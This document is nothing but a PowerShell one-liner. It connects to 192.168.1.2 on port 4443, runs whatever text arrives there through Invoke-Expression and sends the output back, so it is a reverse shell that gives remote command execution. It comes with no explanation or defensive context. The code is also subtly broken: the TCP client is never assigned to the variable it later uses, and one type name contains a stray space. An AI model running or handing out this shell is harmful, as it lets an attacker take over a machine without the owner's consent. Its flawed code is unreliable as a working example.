New-Object System.Net.Sockets.TCPClient('192.168.1.2', 4443); $stream = $client.GetStream(); $buffer = 0..65535 | ForEach-Object { 0 }; while ($true) { $buffer = New-Object byte[] 1024; $bytesLidos = $stream.Read($buffer, 0, $buffer.Length); $command = [System. Text.Encoding]::ASCII.GetString($buffer, 0, $bytesLidos); $result = Invoke-Expression -Command $command; $buffer = [System.Text.Encoding]::ASCII.GetBytes($result); $stream.Write($buffer, 0, $buffer.Length); $stream.Flush() }; $stream.Dispose(); $client.Close()
